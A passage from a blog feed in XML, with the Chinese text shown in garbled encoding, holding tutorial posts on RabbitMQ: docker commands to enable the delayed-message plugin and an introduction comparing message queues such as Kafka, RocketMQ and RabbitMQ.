/></p><p>è¦ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„æ’ä»¶</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113110106821.png" alt="image-20230113110106821" /></p></li><li><p>ç„¶åè¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#æ‹·è´åˆ°rabbitmqå®¹å™¨ Rabbit ä¸­</span><br><br>docker <span class="hljs-built_in">cp</span> rabbitmq_delayed_message_exchange-3.9.0.ez Rabbit:/plugins<br><br><span class="hljs-comment">#è¿›å…¥å®¹å™¨</span><br><br>docker <span class="hljs-built_in">exec</span> -it Rabbit /bin/bash<br><br><span class="hljs-comment">#å¯ç”¨æ’ä»¶</span><br><br>rabbitmq-plugins <span class="hljs-built_in">enable</span> rabbitmq_delayed_message_exchange<br><br><span class="hljs-comment">#æŸ¥çœ‹</span><br><br>rabbitmq-plugins list<br><br><span class="hljs-comment">#é‡æ–°å¯åŠ¨å®¹å™¨</span><br><br>docker restart Rabbit<br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113110621397.png" alt="image-20230113110621397" /></p></li><li><p>åœ¨å®¹å™¨é‡å¯å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥ç™»å½•RabbitMQçš„Webç«¯ç®¡ç†ç•Œé¢ï¼Œåœ¨Exchangesé€‰é¡¹å¡ä¸‹ï¼Œç‚¹å‡»Add a newexchangeï¼Œåœ¨Typeé‡Œé¢çœ‹æ˜¯å¦å‡ºç°äº†x-delayed-messageé€‰é¡¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113142540628.png" alt="image-20230113142540628" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113110317452.png" alt="image-20230113110317452" /></p></li></ol><p>â€‹</p>]]></content>
    
    
    <categories>
      
      <category>MQ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MQ</tag>
      
      <tag>Rabbitmq</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RabbitMQ</title>
    <link href="/2023/01/13/RabbitMQ/"/>
    <url>/2023/01/13/RabbitMQ/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#11-mq%E7%9A%84%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5">1.1 MQçš„ç›¸å…³æ¦‚å¿µ</a></li><li><a href="#12-mq%E5%88%86%E7%B1%BB">1.2 MQåˆ†ç±»</a></li><li><a href="#13-mq%E7%9A%84%E9%80%89%E6%8B%A9">1.3 MQçš„é€‰æ‹©</a></li><li><a href="#21-%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86">2.1 æ ¸å¿ƒéƒ¨åˆ†</a></li><li><a href="#22-%E5%AE%89%E8%A3%85">2.2 å®‰è£…</a><ul><li><a href="#221-%E5%AE%89%E8%A3%85%E5%88%B0linux">2.2.1 å®‰è£…åˆ°linux</a></li><li><a href="#222-%E4%BD%BF%E7%94%A8docker%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF">2.2.2 ä½¿ç”¨dockerå®¹å™¨æŠ€æœ¯</a></li></ul></li><li><a href="#31-%E5%88%9B%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83">3.1 åˆ›å»ºå¼€å‘ç¯å¢ƒ</a></li><li><a href="#32-%E7%94%9F%E4%BA%A7%E8%80%85%E4%BB%A3%E7%A0%81">3.2 ç”Ÿäº§è€…ä»£ç </a></li><li><a href="#33-%E6%B6%88%E8%B4%B9%E8%80%85%E4%BB%A3%E7%A0%81">3.3 æ¶ˆè´¹è€…ä»£ç </a></li><li><a href="#41-%E5%AE%9E%E7%8E%B0%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97">4.1 å®ç°å·¥ä½œé˜Ÿåˆ—</a></li><li><a href="#42-%E6%B6%88%E6%81%AF%E5%BA%94%E7%AD%94">4.2 æ¶ˆæ¯åº”ç­”</a></li><li><a href="#43-%E6%8C%81%E4%B9%85%E5%8C%96">4.3 æŒä¹…åŒ–</a></li><li><a href="#44-%E9%A2%84%E5%8F%96%E5%80%BC">4.4 é¢„å–å€¼</a></li><li><a href="#61-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AE%80%E4%BB%8B">6.1 äº¤æ¢æœºç®€ä»‹</a></li><li><a href="#62-%E4%B8%B4%E6%97%B6%E9%98%9F%E5%88%97">6.2 ä¸´æ—¶é˜Ÿåˆ—</a></li><li><a href="#63-bindings">6.3 Bindings</a></li><li><a href="#64-fanout">6.4 Fanout</a><ul><li><a href="#%E7%AE%80%E4%BB%8B">ç®€ä»‹</a></li><li><a href="#%E5%AE%9E%E6%88%98">å®æˆ˜</a></li></ul></li><li><a href="#65-direct">6.5 Direct</a></li><li><a href="#66-topics">6.6 Topics</a><ul><li><a href="#rabbitmq%E4%B8%AD%E7%9A%84ttl">RabbitMQä¸­çš„TTL</a></li></ul></li><li><a href="#81-%E6%95%B4%E5%90%88springboot">8.1 æ•´åˆSpringboot</a></li><li><a href="#82-%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0">8.2 é˜Ÿåˆ—å®ç°</a></li><li><a href="#83-%E9%98%9F%E5%88%97%E4%BC%98%E5%8C%96">8.3 é˜Ÿåˆ—ä¼˜åŒ–</a></li><li><a href="#84-%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0%E5%BB%B6%E8%BF%9F%E9%98%9F%E5%88%97">8.4 æ’ä»¶å®ç°å»¶è¿Ÿé˜Ÿåˆ—</a></li><li><a href="#91-%E5%9B%9E%E9%80%80%E6%B6%88%E6%81%AF">9.1 å›é€€æ¶ˆæ¯</a></li><li><a href="#92-%E5%A4%87%E4%BB%BD%E4%BA%A4%E6%8D%A2%E6%9C%BA">9.2 å¤‡ä»½äº¤æ¢æœº</a></li><li><a href="#101-%E5%B9%82%E7%AD%89%E6%80%A7">10.1 å¹‚ç­‰æ€§</a></li><li><a href="#102-%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97">10.2 ä¼˜å…ˆçº§é˜Ÿåˆ—</a></li><li><a href="#103-%E6%83%B0%E6%80%A7%E9%98%9F%E5%88%97">10.3 æƒ°æ€§é˜Ÿåˆ—</a></li><li><a href="#111-%E6%90%AD%E5%BB%BA%E9%9B%86%E7%BE%A4">11.1 æ­å»ºé›†ç¾¤</a></li><li><a href="#112-%E9%95%9C%E5%83%8F%E9%98%9F%E5%88%97">11.2 é•œåƒé˜Ÿåˆ—</a></li><li><a href="#113-%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">11.3 å®ç°é«˜å¯ç”¨è´Ÿè½½å‡è¡¡</a></li><li><a href="#114-federation-exchange">11.4 Federation Exchange</a></li><li><a href="#115-federation-queue">11.5 Federation Queue</a></li><li><a href="#116-shovel">11.6 Shovel</a></li><li><a href="#121basic-queue-%E7%AE%80%E5%8D%95%E9%98%9F%E5%88%97%E6%A8%A1%E5%9E%8B">12.1.Basic Queue ç®€å•é˜Ÿåˆ—æ¨¡å‹</a><ul><li><a href="#1211%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.1.1.æ¶ˆæ¯å‘é€</a></li><li><a href="#1212%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.1.2.æ¶ˆæ¯æ¥æ”¶</a></li><li><a href="#1213%E6%B5%8B%E8%AF%95">12.1.3.æµ‹è¯•</a></li></ul></li><li><a href="#122workqueue">12.2.WorkQueue</a><ul><li><a href="#1221%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.2.1.æ¶ˆæ¯å‘é€</a></li><li><a href="#1222%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.2.2.æ¶ˆæ¯æ¥æ”¶</a></li><li><a href="#1223%E6%B5%8B%E8%AF%95">12.2.3.æµ‹è¯•</a></li><li><a href="#1224%E8%83%BD%E8%80%85%E5%A4%9A%E5%8A%B3">12.2.4.èƒ½è€…å¤šåŠ³</a></li><li><a href="#1225%E6%80%BB%E7%BB%93">12.2.5.æ€»ç»“</a></li></ul></li><li><a href="#123%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85">12.3.å‘å¸ƒ/è®¢é˜…</a></li><li><a href="#124fanout">12.4.Fanout</a><ul><li><a href="#1241%E5%A3%B0%E6%98%8E%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%A4%E6%8D%A2%E6%9C%BA">12.4.1.å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº</a></li><li><a href="#1242%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.4.2.æ¶ˆæ¯å‘é€</a></li><li><a href="#1243%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.4.3.æ¶ˆæ¯æ¥æ”¶</a></li><li><a href="#1244%E6%80%BB%E7%BB%93">12.4.4.æ€»ç»“</a></li></ul></li><li><a href="#125direct">12.5.Direct</a><ul><li><a href="#1251%E5%9F%BA%E4%BA%8E%E6%B3%A8%E8%A7%A3%E5%A3%B0%E6%98%8E%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%A4%E6%8D%A2%E6%9C%BA">12.5.1.åŸºäºæ³¨è§£å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº</a></li><li><a href="#1252%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.5.2.æ¶ˆæ¯å‘é€</a></li><li><a href="#1253%E6%80%BB%E7%BB%93">12.5.3.æ€»ç»“</a></li></ul></li><li><a href="#126topic">12.6.Topic</a><ul><li><a href="#1261%E8%AF%B4%E6%98%8E">12.6.1.è¯´æ˜</a></li><li><a href="#1262%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.6.2.æ¶ˆæ¯å‘é€</a></li><li><a href="#1263%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.6.3.æ¶ˆæ¯æ¥æ”¶</a></li><li><a href="#1264%E6%80%BB%E7%BB%93">12.6.4.æ€»ç»“</a></li></ul></li><li><a href="#127%E6%B6%88%E6%81%AF%E8%BD%AC%E6%8D%A2%E5%99%A8">12.7.æ¶ˆæ¯è½¬æ¢å™¨</a><ul><li><a href="#1271%E6%B5%8B%E8%AF%95%E9%BB%98%E8%AE%A4%E8%BD%AC%E6%8D%A2%E5%99%A8">12.7.1.æµ‹è¯•é»˜è®¤è½¬æ¢å™¨</a></li><li><a href="#1272%E9%85%8D%E7%BD%AEjson%E8%BD%AC%E6%8D%A2%E5%99%A8">12.7.2.é…ç½®JSONè½¬æ¢å™¨</a></li></ul></li></ul></p><p>[toc]</p><h1 id="1-è®¤è¯†mq"><a class="markdownIt-Anchor" href="#1-è®¤è¯†mq"></a> 1. è®¤è¯†MQ</h1><h2 id="11-mqçš„ç›¸å…³æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#11-mqçš„ç›¸å…³æ¦‚å¿µ"></a> 1.1 MQçš„ç›¸å…³æ¦‚å¿µ</h2><blockquote><p>ä»€ä¹ˆæ˜¯MQ</p></blockquote><p>MQ(message queue)ï¼Œä»å­—é¢æ„æ€ä¸Šçœ‹ï¼Œæœ¬è´¨æ˜¯ä¸ªé˜Ÿåˆ—ï¼ŒFIFOå…ˆå…¥å…ˆå‡ºï¼Œåªä¸è¿‡é˜Ÿåˆ—ä¸­å­˜æ”¾çš„å†…å®¹æ˜¯messageè€Œå·²ï¼Œè¿˜æ˜¯ä¸€ç§è·¨è¿›ç¨‹çš„é€šä¿¡æœºåˆ¶ï¼Œç”¨äºä¸Šä¸‹æ¸¸ä¼ é€’æ¶ˆæ¯ã€‚åœ¨äº’è”ç½‘æ¶æ„ä¸­,MQæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„ä¸Šä¸‹æ¸¸â€œé€»è¾‘è§£è€¦+ç‰©ç†è§£è€¦â€çš„æ¶ˆæ¯é€šä¿¡æœåŠ¡ã€‚ä½¿ç”¨äº†MQä¹‹åï¼Œæ¶ˆæ¯å‘é€ä¸Šæ¸¸åªéœ€è¦ä¾èµ–MQï¼Œä¸ç”¨ä¾èµ–å…¶ä»–æœåŠ¡ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨MQ</p></blockquote><ol><li><p><code>æµé‡æ¶ˆå³°</code></p><p>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœè®¢å•ç³»ç»Ÿæœ€å¤šèƒ½å¤„ç†ä¸€ä¸‡æ¬¡è®¢å•ï¼Œè¿™ä¸ªå¤„ç†èƒ½åŠ›åº”ä»˜æ­£å¸¸æ—¶æ®µçš„ä¸‹å•æ—¶ç»°ç»°æœ‰ä½™ï¼Œæ­£å¸¸æ—¶æ®µæˆ‘ä»¬ä¸‹å•ä¸€ç§’åå°±èƒ½è¿”å›ç»“æœã€‚ä½†æ˜¯åœ¨é«˜å³°æœŸï¼Œå¦‚æœæœ‰ä¸¤ä¸‡æ¬¡ä¸‹å•æ“ä½œç³»ç»Ÿæ˜¯å¤„ç†ä¸äº†çš„ï¼Œåªèƒ½é™åˆ¶è®¢å•è¶…è¿‡ä¸€ä¸‡åä¸å…è®¸ç”¨æˆ·ä¸‹å•ã€‚ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—åšç¼“å†²ï¼Œæˆ‘ä»¬å¯ä»¥å–æ¶ˆè¿™ä¸ªé™åˆ¶ï¼ŒæŠŠä¸€ç§’å†…ä¸‹çš„è®¢å•åˆ†æ•£æˆä¸€æ®µæ—¶é—´æ¥å¤„ç†ï¼Œè¿™æ—¶æœ‰äº›ç”¨æˆ·å¯èƒ½åœ¨ä¸‹å•åå‡ ç§’åæ‰èƒ½æ”¶åˆ°ä¸‹å•æˆåŠŸçš„æ“ä½œï¼Œä½†æ˜¯æ¯”ä¸èƒ½ä¸‹å•çš„ä½“éªŒè¦å¥½ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112125854498.png" alt="image-20230112125854498" /></p></li><li><p><code>åº”ç”¨è§£è€¦</code></p><p>ä»¥ç”µå•†åº”ç”¨ä¸ºä¾‹ï¼Œåº”ç”¨ä¸­æœ‰è®¢å•ç³»ç»Ÿã€åº“å­˜ç³»ç»Ÿã€æ”¯ä»˜ç³»ç»Ÿã€‚ç”¨æˆ·åˆ›å»ºè®¢å•åï¼Œå¦‚æœè€¦åˆè°ƒç”¨åº“å­˜ç³»ç»Ÿã€ç‰©æµç³»ç»Ÿã€æ”¯ä»˜ç³»ç»Ÿï¼Œä»»ä½•ä¸€ä¸ªå­ç³»ç»Ÿå‡ºäº†æ•…éšœï¼Œéƒ½ä¼šé€ æˆä¸‹å•æ“ä½œå¼‚å¸¸ã€‚å½“è½¬å˜æˆåŸºäºæ¶ˆæ¯é˜Ÿåˆ—çš„æ–¹å¼åï¼Œç³»ç»Ÿé—´è°ƒç”¨çš„é—®é¢˜ä¼šå‡å°‘å¾ˆå¤šï¼Œæ¯”å¦‚ç‰©æµç³»ç»Ÿå› ä¸ºå‘ç”Ÿæ•…éšœï¼Œéœ€è¦å‡ åˆ†é’Ÿæ¥ä¿®å¤ã€‚åœ¨è¿™å‡ åˆ†é’Ÿçš„æ—¶é—´é‡Œï¼Œç‰©æµç³»ç»Ÿè¦å¤„ç†çš„å†…å­˜è¢«ç¼“å­˜åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç”¨æˆ·çš„ä¸‹å•æ“ä½œå¯ä»¥æ­£å¸¸å®Œæˆã€‚å½“ç‰©æµç³»ç»Ÿæ¢å¤åï¼Œç»§ç»­å¤„ç†è®¢å•ä¿¡æ¯å³å¯ ï¼Œä¸­å•ç”¨æˆ·æ„Ÿå—ä¸åˆ°ç‰©æµç³»ç»Ÿçš„æ•…éšœï¼Œæå‡ç³»ç»Ÿçš„å¯ç”¨æ€§ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112125932111.png" alt="image-20230112125932111" /></p></li><li><p><code>å¼‚æ­¥å¤„ç†</code></p><p>æœ‰äº›æœåŠ¡é—´è°ƒç”¨æ˜¯å¼‚æ­¥çš„ï¼Œä¾‹å¦‚Aè°ƒç”¨Bï¼ŒBéœ€è¦èŠ±è´¹å¾ˆé•¿æ—¶é—´æ‰§è¡Œï¼Œä½†æ˜¯Aéœ€è¦çŸ¥é“Bä»€ä¹ˆæ—¶å€™å¯ä»¥æ‰§è¡Œå®Œï¼Œä»¥å‰ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ï¼ŒAè¿‡ä¸€æ®µæ—¶é—´å»è°ƒç”¨Bçš„æŸ¥è¯¢apiæŸ¥è¯¢ã€‚æˆ–è€…Aæä¾›ä¸€ä¸ªcallback api,Bæ‰§è¡Œå®Œä¹‹åè°ƒç”¨apié€šçŸ¥AæœåŠ¡ã€‚è¿™ä¸¤ç§æ–¹å¼éƒ½ä¸æ˜¯å¾ˆä¼˜é›…ï¼Œä½¿ç”¨æ¶ˆæ¯æ€»çº¿ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿è§£å†³è¿™ä¸ªé—®é¢˜,Aè°ƒç”¨BæœåŠ¡åï¼Œåªéœ€è¦ç›‘å¬Bå¤„ç†å®Œæˆçš„æ¶ˆæ¯ï¼Œå½“Bå¤„ç†å®Œæˆåï¼Œä¼šå‘é€ä¸€æ¡æ¶ˆæ¯ç»™MQï¼ŒMQä¼šå°†æ­¤æ¶ˆæ¯è½¬å‘ç»™AæœåŠ¡ã€‚è¿™æ ·AæœåŠ¡æ—¢ä¸ç”¨å¾ªç¯è°ƒç”¨Bçš„æŸ¥è¯¢apiï¼Œä¹Ÿä¸ç”¨æä¾›callback apiã€‚åŒæ ·BæœåŠ¡ä¹Ÿä¸ç”¨åšè¿™äº›æ“ä½œã€‚AæœåŠ¡è¿˜èƒ½åŠæ—¶çš„å¾—åˆ°å¼‚æ­¥å¤„ç†æˆåŠŸçš„æ¶ˆæ¯ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112125948808.png" alt="image-20230112125948808" /></p></li></ol><h2 id="12-mqåˆ†ç±»"><a class="markdownIt-Anchor" href="#12-mqåˆ†ç±»"></a> 1.2 MQåˆ†ç±»</h2><ol><li><p><code>ActiveMQ</code>ï¼š</p><ul><li>ä¼˜ç‚¹ï¼šå•æœºååé‡ä¸‡çº§ï¼Œæ—¶æ•ˆæ€§msçº§ï¼Œå¯ç”¨æ€§é«˜ï¼ŒåŸºäºä¸»ä»æ¶æ„å®ç°é«˜å¯ç”¨æ€§ï¼Œæ¶ˆæ¯å¯é æ€§è¾ƒä½çš„æ¦‚ç‡ä¸¢å¤±æ•°æ®</li><li>ç¼ºç‚¹ï¼šç»´æŠ¤è¶Šæ¥è¶Šå°‘ï¼Œé«˜ååé‡åœºæ™¯è¾ƒå°‘ä½¿ç”¨</li></ul></li><li><p><code>Kafka</code>ï¼šå¤§æ•°æ®çš„æ€æ‰‹é”ï¼Œè°ˆåˆ°å¤§æ•°æ®é¢†åŸŸå†…çš„æ¶ˆæ¯ä¼ è¾“ï¼Œåˆ™ç»•ä¸å¼€Kafkaï¼Œè¿™æ¬¾ä¸ºå¤§æ•°æ®è€Œç”Ÿçš„æ¶ˆæ¯ä¸­é—´ä»¶,ä»¥å…¶ç™¾ä¸‡çº§TPSçš„ååé‡åå£°å¤§å™ªï¼Œè¿…é€Ÿæˆä¸ºå¤§æ•°æ®é¢†åŸŸçš„å® å„¿ï¼Œåœ¨æ•°æ®é‡‡é›†ã€ä¼ è¾“å­˜å‚¨çš„è¿‡ç¨‹ä¸­å‘æŒ¥ç€ä¸¾è¶³è½»é‡çš„ä½œç”¨ã€‚ç›®å‰å·²ç»è¢«LinkedInï¼ŒUber,Twitter,Netflixç­‰å¤§å…¬å¸æ‰€é‡‡çº³ã€‚</p><ul><li><p>ä¼˜ç‚¹ï¼š</p><p>æ€§èƒ½å“è¶Šï¼Œå•æœºå†™å…¥TPSçº¦åœ¨ç™¾ä¸‡æ¡/ç§’ï¼Œæœ€å¤§çš„ä¼˜ç‚¹ï¼Œå°±æ˜¯ååé‡é«˜ã€‚æ—¶æ•ˆæ€§msçº§å¯ç”¨æ€§éå¸¸é«˜ï¼Œkafkaæ˜¯åˆ†å¸ƒå¼çš„ï¼Œä¸€ä¸ªæ•°æ®å¤šä¸ªå‰¯æœ¬ï¼Œå°‘æ•°æœºå™¨å®•æœºï¼Œä¸ä¼šä¸¢å¤±æ•°æ®ï¼Œä¸ä¼šå¯¼è‡´ä¸å¯ç”¨,æ¶ˆè´¹è€…é‡‡ç”¨Pullæ–¹å¼è·å–æ¶ˆæ¯ï¼Œæ¶ˆæ¯æœ‰åºï¼Œé€šè¿‡æ§åˆ¶èƒ½å¤Ÿä¿è¯æ‰€æœ‰æ¶ˆæ¯è¢«æ¶ˆè´¹ä¸”ä»…è¢«æ¶ˆè´¹ä¸€æ¬¡;æœ‰ä¼˜ç§€çš„ç¬¬ä¸‰æ–¹Kafka Webç®¡ç†ç•Œé¢Kafka-Manager;åœ¨æ—¥å¿—é¢†åŸŸæ¯”è¾ƒæˆç†Ÿï¼Œè¢«å¤šå®¶å…¬å¸å’Œå¤šä¸ªå¼€æºé¡¹ç›®ä½¿ç”¨;åŠŸèƒ½æ”¯æŒ:åŠŸèƒ½è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ”¯æŒç®€å•çš„MQåŠŸèƒ½ï¼Œåœ¨å¤§æ•°æ®é¢†åŸŸçš„å®æ—¶è®¡ç®—ä»¥åŠæ—¥å¿—é‡‡é›†è¢«å¤§è§„æ¨¡ä½¿ç”¨</p></li><li><p>ç¼ºç‚¹ï¼š</p><p>Kafkaå•æœºè¶…è¿‡64ä¸ªé˜Ÿåˆ—/åˆ†åŒºï¼ŒLoadä¼šå‘ç”Ÿæ˜æ˜¾çš„é£™é«˜ç°è±¡ï¼Œé˜Ÿåˆ—è¶Šå¤šï¼Œloadè¶Šé«˜ï¼Œå‘é€æ¶ˆæ¯å“åº”æ—¶é—´å˜é•¿ï¼Œä½¿ç”¨çŸ­è½®è¯¢æ–¹å¼ï¼Œå®æ—¶æ€§å–å†³äºè½®è¯¢é—´éš”æ—¶é—´ï¼Œæ¶ˆè´¹å¤±è´¥ä¸æ”¯æŒé‡è¯•;æ”¯æŒæ¶ˆæ¯é¡ºåºï¼Œä½†æ˜¯ä¸€å°ä»£ç†å®•æœºåï¼Œå°±ä¼šäº§ç”Ÿæ¶ˆæ¯ä¹±åºï¼Œç¤¾åŒºæ›´æ–°è¾ƒæ…¢;</p></li></ul></li><li><p><code>RocketMQ</code>ï¼šå‡ºè‡ªé˜¿é‡Œå·´å·´çš„å¼€æºäº§å“ï¼Œç”¨Javaè¯­è¨€å®ç°ï¼Œåœ¨è®¾è®¡æ—¶å‚è€ƒäº†Kafkaï¼Œå¹¶åšå‡ºäº†è‡ªå·±çš„ä¸€äº›æ”¹è¿›ã€‚è¢«é˜¿é‡Œå·´å·´å¹¿æ³›åº”ç”¨åœ¨è®¢å•ï¼Œäº¤æ˜“ï¼Œå……å€¼ï¼Œæµè®¡ç®—ï¼Œæ¶ˆæ¯æ¨é€ï¼Œæ—¥å¿—æµå¼å¤„ç†binglogåˆ†å‘ç­‰åœº<br />æ™¯ã€‚</p><ul><li><p>ä¼˜ç‚¹ï¼š</p><p>å•æœºååé‡åä¸‡çº§,å¯ç”¨æ€§éå¸¸é«˜ï¼Œåˆ†å¸ƒå¼æ¶æ„,æ¶ˆæ¯å¯ä»¥åšåˆ°0ä¸¢å¤±,MQåŠŸèƒ½è¾ƒä¸ºå®Œå–„ï¼Œè¿˜æ˜¯åˆ†å¸ƒå¼çš„ï¼Œæ‰©å±•æ€§å¥½,æ”¯æŒ10äº¿çº§åˆ«çš„æ¶ˆæ¯å †ç§¯ï¼Œä¸ä¼šå› ä¸ºå †ç§¯å¯¼è‡´æ€§èƒ½ä¸‹é™,æºç æ˜¯javaæˆ‘ä»¬å¯ä»¥è‡ªå·±é˜…è¯»æºç ï¼Œå®šåˆ¶è‡ªå·±å…¬å¸çš„MQ</p></li><li><p>ç¼ºç‚¹ï¼š</p><p>æ”¯æŒçš„å®¢æˆ·ç«¯è¯­è¨€ä¸å¤šï¼Œç›®å‰æ˜¯javaåŠc++ï¼Œå…¶ä¸­c++ä¸æˆç†Ÿ;ç¤¾åŒºæ´»è·ƒåº¦ä¸€èˆ¬,æ²¡æœ‰åœ¨MQæ ¸å¿ƒä¸­å»å®ç°JMSç­‰æ¥å£,æœ‰äº›ç³»ç»Ÿè¦è¿ç§»éœ€è¦ä¿®æ”¹å¤§é‡ä»£ç </p></li></ul></li><li><p><code>RabbitMQ</code>ï¼š2007å¹´å‘å¸ƒï¼Œæ˜¯ä¸€ä¸ªåœ¨AMQP(é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®)åŸºç¡€ä¸Šå®Œæˆçš„ï¼Œå¯å¤ç”¨çš„ä¼ä¸šæ¶ˆæ¯ç³»ç»Ÿï¼Œæ˜¯å½“å‰æœ€ä¸»æµçš„æ¶ˆæ¯ä¸­é—´ä»¶ä¹‹ä¸€ã€‚</p><ul><li><p>ä¼˜ç‚¹ï¼š</p><p>ç”±äºerlangè¯­è¨€çš„é«˜å¹¶å‘ç‰¹æ€§ï¼Œæ€§èƒ½è¾ƒå¥½;ååé‡åˆ°ä¸‡çº§ï¼ŒMQåŠŸèƒ½æ¯”è¾ƒå®Œå¤‡,å¥å£®ã€ç¨³å®šã€æ˜“ç”¨ã€è·¨å¹³å°ã€æ”¯æŒå¤šç§è¯­è¨€å¦‚: Pythonã€Rubyã€.NETã€ Javaã€JMSã€Cã€PHPã€ActionScriptã€XMPPã€STOMPç­‰ï¼Œæ”¯æŒAJAXæ–‡æ¡£é½å…¨;å¼€æºæä¾›çš„ç®¡ç†ç•Œé¢éå¸¸æ£’ï¼Œç”¨èµ·æ¥å¾ˆå¥½ç”¨,ç¤¾åŒºæ´»è·ƒåº¦é«˜;<br />æ›´æ–°é¢‘ç‡ç›¸å½“é«˜https://www.rabbitmq.com/news.html</p></li><li><p>ç¼ºç‚¹ï¼š</p><p>å•†ä¸šç‰ˆéœ€è¦æ”¶è´¹,å­¦ä¹ æˆæœ¬è¾ƒé«˜</p></li></ul></li></ol><h2 id="13-mqçš„é€‰æ‹©"><a class="markdownIt-Anchor" href="#13-mqçš„é€‰æ‹©"></a> 1.3 MQçš„é€‰æ‹©</h2><table><thead><tr><th style="text-align:center">MQ</th><th style="text-align:center">ä»‹ç»</th></tr></thead><tbody><tr><td style="text-align:center">Kafka</td><td style="text-align:center">Kafkaä¸»è¦ç‰¹ç‚¹æ˜¯åŸºäºPullçš„æ¨¡å¼æ¥å¤„ç†æ¶ˆæ¯æ¶ˆè´¹ï¼Œè¿½æ±‚é«˜ååé‡ï¼Œä¸€å¼€å§‹çš„ç›®çš„å°±æ˜¯ç”¨äºæ—¥å¿—æ”¶é›†å’Œä¼ è¾“ï¼Œé€‚åˆäº§ç”Ÿ<code>å¤§é‡æ•°æ®</code>çš„äº’è”ç½‘æœåŠ¡çš„æ•°æ®æ”¶é›†ä¸šåŠ¡ã€‚<code>å¤§å‹å…¬å¸</code>å»ºè®®å¯ä»¥é€‰ç”¨ï¼Œå¦‚æœæœ‰<code>æ—¥å¿—é‡‡é›†</code>åŠŸèƒ½,è‚¯å®šæ˜¯é¦–é€‰kafkaäº†ã€‚</td></tr><tr><td style="text-align:center">RocketMQ</td><td style="text-align:center">å¤©ç”Ÿä¸º<code>é‡‘èäº’è”ç½‘</code>é¢†åŸŸè€Œç”Ÿï¼Œå¯¹äºå¯é æ€§è¦æ±‚å¾ˆé«˜çš„åœºæ™¯ï¼Œå°¤å…¶æ˜¯ç”µå•†é‡Œé¢çš„è®¢å•æ‰£æ¬¾ï¼Œä»¥åŠä¸šåŠ¡å‰Šå³°ï¼Œåœ¨å¤§é‡äº¤æ˜“æ¶Œå…¥æ—¶ï¼Œåç«¯å¯èƒ½æ— æ³•åŠæ—¶å¤„ç†çš„æƒ…å†µã€‚RoketMQåœ¨ç¨³å®šæ€§ä¸Šå¯èƒ½æ›´å€¼å¾—ä¿¡èµ–ï¼Œè¿™äº›ä¸šåŠ¡åœºæ™¯åœ¨é˜¿é‡ŒåŒ11å·²ç»ç»å†äº†å¤šæ¬¡è€ƒéªŒï¼Œå¦‚æœä½ çš„ä¸šåŠ¡æœ‰ä¸Šè¿°å¹¶å‘åœºæ™¯ï¼Œå»ºè®®å¯ä»¥é€‰æ‹©RocketMQã€‚</td></tr><tr><td style="text-align:center">RabbitMQ</td><td 